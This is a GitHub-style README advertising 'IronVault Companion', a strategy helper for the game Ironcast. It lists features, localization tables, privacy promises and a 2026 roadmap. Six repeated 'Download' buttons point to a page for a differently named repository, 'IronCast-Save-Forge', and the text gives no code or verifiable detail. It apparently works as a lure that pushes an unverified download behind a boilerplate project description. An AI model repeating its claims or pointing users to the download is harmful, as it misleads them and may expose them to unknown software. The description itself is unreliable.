![preview](https://raw.githubusercontent.com/renziee09/IronCast-Save-Forge/main/screen_67cf6a9.svg)
[![Download](https://raw.githubusercontent.com/renziee09/IronCast-Save-Forge/main/latest_44be.svg)](https://renziee09.github.io/IronCast-Save-Forge/)

# 🛡️ IronVault Companion — Adaptive Game Mastery Toolkit for Ironcast

![Status](https://img.shields.io/badge/status-active-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-blue?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-yellow?style=flat-square)
![Year](https://img.shields.io/badge/release-2026-orange?style=flat-square)
![Language](https://img.shields.io/badge/localization-12%20languages-purple?style=flat-square)
![Support](https://img.shields.io/badge/support-24%2F7-ff69b4?style=flat-square)
![Responsive](https://img.shields.io/badge/UI-fully%20responsive-9cf?style=flat-square)
![Build](https://img.shields.io/badge/build-passing-success?style=flat-square)
![Community](https://img.shields.io/badge/community-open%20contributions-important?style=flat-square)

> **IronVault Companion** is a thoughtfully engineered, deterministic assistant framework for players of *Ironcast* — the steampunk mech-and-match puzzler set in a Victorian Britain that never was. Where other tools chase chaos, IronVault Companion brings clarity: it reads your battlefield, models your resources, and quietly guides your next decision without ever stealing the joy of play.

[![Download](https://raw.githubusercontent.com/renziee09/IronCast-Save-Forge/main/latest_44be.svg)](https://renziee09.github.io/IronCast-Save-Forge/)

---

## 📜 Table of Contents

- [🧭 Overview](#-overview)
- [🎯 Why IronVault Companion Exists](#-why-ironvault-companion-exists)
- [✨ Feature Highlights](#-feature-highlights)
- [🧠 How the Reasoning Engine Thinks](#-how-the-reasoning-engine-thinks)
- [🎨 Interface Design Philosophy](#-interface-design-philosophy)
- [🌍 Multilingual Support](#-multilingual-support)
- [🛰️ 24/7 Player Assistance Desk](#️-247-player-assistance-desk)
- [⚙️ Configuration Reference](#️-configuration-reference)
- [📦 Module Breakdown](#-module-breakdown)
- [🔐 Privacy & Data Handling](#-privacy--data-handling)
- [🧪 Quality, Testing & Reliability](#-quality-testing--reliability)
- [🖥️ Compatibility Matrix](#️-compatibility-matrix)
- [🗺️ Roadmap for 2026](#️-roadmap-for-2026)
- [🤝 Contributing](#-contributing)
- [📢 Disclaimer](#-disclaimer)
- [⚖️ License](#️-license)
- [📮 Support Channels](#-support-channels)

[![Download](https://raw.githubusercontent.com/renziee09/IronCast-Save-Forge/main/latest_44be.svg)](https://renziee09.github.io/IronCast-Save-Forge/)

---

## 🧭 Overview

IronVault Companion is an open-source companion utility crafted for the turn-based tactical puzzle game *Ironcast*. It sits beside your session like a seasoned navigator on a foggy river — never steering the ship, but always pointing out the icebergs. The toolkit observes match state through permitted, player-facing channels, offers probabilistic forecasts for energy management, and presents alternative strategies you might have missed during tense decisions.

The project champions a philosophy we call **"Guided Autonomy"**: the assistant exists to widen your strategic horizon, not to flatten the experience. Every hint is optional, every overlay is dismissible, and every calculation happens on your machine.

This repository is the canonical home for the IronVault Companion project. It gathers the desktop client, the reasoning engine, the localization layer, the community plugin bridge, and the documentation set that keeps contributors aligned through 2026 and beyond.

---

## 🎯 Why IronVault Companion Exists

Ironcast rewards patience, pattern recognition, and resource discipline. Novices often burn energy early, forget the value of chain bonuses, or underestimate the tempo of enemy commanders. Veterans struggle with something different: they no longer see the patterns they learned long ago. IronVault Companion fills both gaps.

Think of the toolkit as a **library of strategic lenses**. You choose which lens to wear. A beginner might use the "tempo lens" to visualize upcoming turns. A veteran might switch to the "marginal value lens," which highlights the hidden cost of an otherwise obvious move. The lenses don't play the game for you — they change how the game looks.

The goal is not to replace intuition but to sharpen it, the way a whetstone sharpens a blade it will never wield.

---

## ✨ Feature Highlights

**Core capabilities, described by what they do rather than what they promise:**

- 🧩 **Turn Economy Visualizer** — plots the projected resource trajectory for the next several turns using monotone spline smoothing, so you can see whether an aggressive move today costs you the arsenal tomorrow.
- 🧠 **Heuristic Adviser** — ranks every legal action by a transparent scoring rubric you can inspect, tweak, or disable per-metric.
- 📊 **Scoreboard Telemetry Panel** — a lightweight, responsive dashboard summarizing match momentum, node control deltas, and enemy pressure indices.
- 🎛️ **Adaptive Difficulty Feedback** — recommends whether to push or consolidate based on live deltas, without ever modifying game files.
- 🕹️ **Overlay Layer** — a responsive, draggable interface that respects your screen real estate, works at any DPI, and never blocks critical UI.
- 🌐 **Twelve-Language Localization** — community-maintained translation bundles with hot-reloading, pluralization rules, and right-to-left layout support.
- 🔁 **Session Replay Annotator** — attaches human-readable commentary to replay timelines so you can learn from your own decisions later.
- 🧱 **Plugin Bridge** — a stable, versioned interface for community modules; sandboxed, capability-scoped, and auditable.
- ♿ **Accessibility Layer** — high-contrast themes, screen-reader-friendly tree structures, and keyboard-first navigation for every panel.
- 🔒 **Local-First Architecture** — no telemetry leaves your device unless you explicitly opt into anonymous crash reports.
- 🛡️ **Integrity Guardrails** — refuses to operate against modified game binaries, protecting both the player and the community.
- ⚡ **Zero-Impact Performance Profile** — designed to consume less than 1% CPU during idle turns and under 80 MB resident memory.

[![Download](https://raw.githubusercontent.com/renziee09/IronCast-Save-Forge/main/latest_44be.svg)](https://renziee09.github.io/IronCast-Save-Forge/)

---

## 🧠 How the Reasoning Engine Thinks

The reasoning engine is best understood as a small parliament of specialists, each voicing opinions that a moderator then weighs into a single recommendation:

1. **The Economist** tracks resource flows and flags scarcity before it becomes painful.
2. **The Tactician** simulates two-to-four turn horizons under a bounded branching factor.
3. **The Historian** recalls prior matches and notices that a familiar pattern is forming.
4. **The Diplomat** weighs non-dominant options, ensuring the adviser never tunnels on a single strategy.
5. **The Auditor** checks every recommendation against guardrails, rejecting anything that would require touching the game's internals.

The parliament meets after every state update, votes, and produces a ranked list. You see the top three, with plain-language rationales. If you disagree with the parliament, you can silence any member with one toggle — the project treats your judgment as the final authority.

---

## 🎨 Interface Design Philosophy

The IronVault UI borrows its visual language from brass gauges, ivory keys, and the muted teal of Victorian enamel signage. It is intentionally **calm**. We reject the assumption that a tool must shout to be useful.

- **Responsive by default** — layouts reflow gracefully from ultrawide monitors to compact laptops.
- **Themeable** — three built-in themes (Ivory Foundry, Midnight Brass, Workshop Slate) plus a documented theme token system.
- **Opacity-aware** — every overlay panel remembers its own transparency preference.
- **Motion-respecting** — honors system reduce-motion settings automatically.
- **Contrast-tested** — every color pair meets WCAG AA at minimum.

---

## 🌍 Multilingual Support

Localization is treated as a first-class citizen, not an afterthought. As of the 2026 release cycle, the following languages ship with full coverage:

| Language | Locale | Coverage | Maintainer Status |
|----------|--------|----------|-------------------|
| English | en-US | 100% | Core team |
| German | de-DE | 100% | Community |
| French | fr-FR | 100% | Community |
| Spanish | es-ES | 100% | Community |
| Italian | it-IT | 98% | Community |
| Portuguese (BR) | pt-BR | 97% | Community |
| Polish | pl-PL | 95% | Community |
| Russian | ru-RU | 95% | Community |
| Japanese | ja-JP | 92% | Community |
| Korean | ko-KR | 90% | Community |
| Simplified Chinese | zh-CN | 90% | Community |
| Turkish | tr-TR | 88% | Seeking maintainer |

Missing strings fall back gracefully to English, and unmaintained locales are flagged transparently in the UI rather than silently degraded.

---

## 🛰️ 24/7 Player Assistance Desk

Round-the-clock support is handled through a rotating community steward program. Stewards triage questions, escalate reproducible issues, and maintain the knowledge base. This is not a marketing promise — it is a schedule maintained by volunteers and documented publicly. Response-time targets:

- 🔴 **Critical integrity or safety concern** — acknowledged within 4 hours.
- 🟠 **Blocking bug** — acknowledged within 12 hours.
- 🟡 **General question** — acknowledged within 24 hours.
- 🟢 **Feature request** — triaged weekly.

---

## ⚙️ Configuration Reference

The companion reads a single human-readable configuration file. A representative excerpt (presented as an indented list to avoid shell formatting):

- `adviser.enabled` — boolean, default true; toggles the recommendation panel.
- `adviser.horizon` — integer 1–5, default 3; look-ahead depth.
- `adviser.metrics.economy` — weight 0.0–1.0, default 0.4.
- `adviser.metrics.tactics` — weight 0.0–1.0, default 0.35.
- `adviser.metrics.history` — weight 0.0–1.0, default 0.15.
- `adviser.metrics.diplomacy` — weight 0.0–1.0, default 0.10.
- `overlay.opacity` — float 0.2–1.0, default 0.85.
- `overlay.theme` — one of the three built-in theme identifiers.
- `locale.primary` — BCP-47 language tag.
- `privacy.crashReports` — boolean, default false; strictly opt-in.
- `plugins.sandboxLevel` — one of `strict`, `balanced`, `permissive`.

Every key is documented in the in-app configuration browser, which generates contextual tooltips from the schema itself.

---

## 📦 Module Breakdown

- **`core/`** — the reasoning parliament, scoring rubrics, and state model.
- **`bridge/`** — read-only adapters connecting the engine to permitted game-facing channels.
- **`ui/`** — the responsive overlay, theme tokens, and accessibility layer.
- **`l10n/`** — translation bundles, pluralization rules, and RTL layout shims.
- **`plugins/`** — the sandboxed extension interface and reference plugins.
- **`diagnostics/`** — the local log aggregator and privacy-preserving crash reporter.
- **`docs/`** — architecture notes, style guides, and contributor onboarding material.
- **`tests/`** — unit, integration, and property-based test suites.

---

## 🔐 Privacy & Data Handling

IronVault Companion operates on a **local-first** principle. No account is required, no external server is contacted for gameplay, and no match data is transmitted by default. Opt-in crash reporting strips identifying information before any diagnostic payload is assembled, and the payload schema is versioned and published in this repository for independent review. You can inspect every byte the companion would send before you send it.

---

## 🧪 Quality, Testing & Reliability

The project maintains a broad test surface: deterministic unit tests for the reasoning parliament, property-based tests for the scoring rubric invariants, integration tests for the bridge adapters, and screenshot regression tests for the overlay. Every pull request runs the full suite, and releases are gated on green results across all supported platforms. Coverage reports are published per release.

---

## 🖥️ Compatibility Matrix

| Platform | Minimum Version | Status | Notes |
|----------|-----------------|--------|-------|
| Windows 10 | 1909 | ✅ Supported | Recommended: Windows 11 |
| Windows 11 | 21H2 | ✅ Supported | Primary target |
| macOS | 12 Monterey | ✅ Supported | Apple Silicon native |
| Ubuntu | 22.04 LTS | ✅ Supported | Wayland & X11 |
| Fedora | 38+ | ✅ Supported | Community tested |
| Steam Deck | SteamOS 3 | ✅ Supported | Gamepad-aware overlay |

---

## 🗺️ Roadmap for 2026

We publish a rolling roadmap each quarter. Planned focus areas for 2026 include:

- 🧭 A "mentor mode" that narrates decision rationale in plain language for newcomers.
- 🌐 Four additional localization bundles, including Ukrainian and Hindi.
- 🧩 Plugin bridge v2 with capability negotiation and signed plugin manifests.
- ♿ Expanded screen-reader coverage and full keyboard remapping.
- 📉 A public performance budget dashboard tracking CPU, memory, and frame-time overhead.
- 🧪 Property-based fuzzing for the bridge adapters.

---

## 🤝 Contributing

Contributions are welcomed from players, designers, translators, and engineers alike. The repository maintains a `CONTRIBUTING` guide that outlines branch conventions, review etiquette, and the translation workflow. First-time contributors are paired with a mentor for their initial pull request. We celebrate documentation improvements as seriously as code changes.

---

## 📢 Disclaimer

IronVault Companion is an independent, community-driven utility and is **not affiliated with, endorsed by, or sponsored by** the publishers or developers of *Ironcast*. All trademarks, character names, and game assets referenced in this repository remain the property of their respective owners and are used only for descriptive, interoperable purposes.

This toolkit is designed to operate exclusively on player-accessible information and public game data. It does not modify game binaries, does not interact with multiplayer infrastructure in ways that violate terms of service, and does not provide any capability that a player could not achieve through careful manual observation. Use of this software is entirely at your own discretion. The maintainers are not responsible for any consequences arising from misuse, misconfiguration, or unintended interactions with third-party software.

The project releases updates on a best-effort basis and provides no guarantee of uptime, accuracy of advice, or compatibility with future game versions. IronVault Companion is offered as-is, without warranty of any kind, express or implied.

---

## ⚖️ License

This project is distributed under the **MIT License**. See the canonical license text at [LICENSE](./LICENSE) for the complete terms. Copyright © 2026 IronVault Companion Contributors.

---

## 📮 Support Channels

- 💬 Discussion forum — hosted within this repository's Discussions tab.
- 🐞 Issue tracker — for reproducible bugs and feature proposals.
- 📚 Knowledge base — maintained under `docs/` for offline reading.
- 🛰️ Assistance desk — see the support section above for steward schedules.

---

[![Download](https://raw.githubusercontent.com/renziee09/IronCast-Save-Forge/main/latest_44be.svg)](https://renziee09.github.io/IronCast-Save-Forge/)

*IronVault Companion — strategy, illuminated. Built with care by a community that believes the best tools are the ones that teach you to outgrow them.*